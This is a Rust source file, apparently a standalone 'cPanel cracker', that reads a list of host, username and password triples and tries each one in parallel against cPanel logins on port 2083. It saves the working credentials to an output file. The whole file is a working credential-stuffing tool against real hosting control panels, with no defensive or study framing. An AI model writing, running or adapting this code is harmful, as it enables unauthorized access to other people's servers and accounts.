use colored::Colorize;
use rayon::prelude::*;
use reqwest::Client;
use std::fs::{create_dir_all, File, OpenOptions};
use std::io::{self, BufRead, BufReader, Write};
use std::time::{Duration, Instant};
use tokio::runtime::Runtime;

// Create a reqwest client with rustls-tls
fn create_client() -> Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .use_rustls_tls()
        .build()
        .expect("Failed to build HTTP client")
}

// Async function to check cpanel login
async fn cpanel(url: &str, client: &Client) -> bool {
    // Try to split the url to get username / password
    let parts: Vec<&str> = url.split('|').collect();
    if parts.len() != 3 {
        println!(
            "Url {} seems to have wrong format.",
            url
        );
        return false;
    }

    let (base_url, username, password) = (parts[0].to_string(), parts[1], parts[2]);
    
    // Add https:// to the beginning of the URL if it's not already there
    let url = if !base_url.starts_with("https://") {
        format!("https://{}", base_url)
    } else {
        base_url
    };

    // Build the correct url
    let full_url = format!("{}:2083", url);

    // Build post parameters
    let params = [("user", username), ("pass", password)];

    // Make request
    match client.post(&full_url).form(&params).send().await {
        Ok(response) => {
            let status = response.status();
            match response.text().await {
                Ok(text) => {
                    if text.contains("status") && text.contains("security_token") {
                        println!("{}", format!("[Login For User {} Success]", username).green());
                        
                        // Ensure output directory exists
                        if let Err(e) = create_dir_all("output") {
                            eprintln!("Failed to create output directory: {}", e);
                            return true;
                        }
                        
                        // Save successful login credentials to file
                        let mut file = match OpenOptions::new()
                            .create(true)
                            .append(true)
                            .open("output/cpanelfound.txt")
                        {
                            Ok(f) => f,
                            Err(e) => {
                                eprintln!("Failed to open output file: {}", e);
                                return true;
                            }
                        };
                        
                        if let Err(e) = writeln!(file, "{}|{}|{}", url, username, password) {
                            eprintln!("Failed to write to output file: {}", e);
                        }
                        
                        true
                    } else {
                        println!(
                            "{}",
                            format!("[Login Failed] {} message \"{}\"", url, status)
                                .red()
                        );
                        false
                    }
                }
                Err(e) => {
                    println!(
                        "{}",
                        format!("[Failed to read response] {} error: {}", url, e).red()
                    );
                    false
                }
            }
        }
        Err(e) => {
            println!(
                "{}",
                format!("[Cpanel Doesn't Exist] {} error: {}", url, e).red()
            );
            false
        }
    }
}

// Check function that wraps the async cpanel function
fn checker(url: &str) -> bool {
    let rt = Runtime::new().expect("Failed to create Tokio runtime");
    let client = create_client();
    rt.block_on(cpanel(url, &client))
}

/// Run the cPanel cracker
/// 
/// This function will prompt the user for an input file and then
/// process the URLs in the file to check for cPanel logins
/// 
/// # Returns
/// 
/// A vector of booleans indicating which URLs were successfully cracked
pub fn run_crack() -> Vec<bool> {
    println!("[+] submit file: ");
    
    // Read filename from stdin
    let mut filename = String::new();
    io::stdin()
        .read_line(&mut filename)
        .expect("Failed to read input");
    
    let filename = filename.trim();
    
    // Read file content
    let list_data = match File::open(filename) {
        Ok(file) => {
            let reader = BufReader::new(file);
            reader.lines().filter_map(Result::ok).collect::<Vec<String>>()
        }
        Err(_) => {
            println!("Failed to read file {}", filename);
            Vec::new()
        }
    };
    
    if list_data.is_empty() {
        println!("No data to process.");
        return Vec::new();
    }
    
    // Start timer
    let start_time = Instant::now();
    
    // Process URLs in parallel using rayon
    let results: Vec<bool> = list_data
        .par_iter()
        .map(|url| checker(url))
        .collect();
    
    // Print elapsed time
    println!(
        "Elapsed time: {:.2} seconds",
        start_time.elapsed().as_secs_f64()
    );
    
    results
}
